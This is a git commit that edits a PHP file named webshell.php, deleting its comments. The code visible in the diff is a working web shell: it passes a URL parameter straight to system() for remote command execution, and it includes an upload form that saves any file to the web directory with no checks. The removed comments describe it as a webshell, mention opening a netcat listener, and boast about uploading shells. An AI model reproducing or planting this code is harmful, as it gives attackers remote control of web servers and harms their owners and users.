4d83d8adf863d7bdb3142a2f910d9a4c0f2d4830
cainesmckoy <caine12393@yahoo.com>
2019-03-29 15:51:34 -0400

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -15,17 +15,17 @@
     {
         system($_GET['cmd']);
     }
-//creates a webshell, stuck in user:www-data, but a netcat listener can be created
+
 ?>
 <?php
-//upload files, any file, 5h311z 4 d@yz
+
 $target_dir = "";
 $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
 $uploadOk = 1;
 $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
-// Check if image file is a actual image or fake image
+
 if(isset($_POST["submit"])) {
-    //$check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+   
     if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
         echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
     } else {
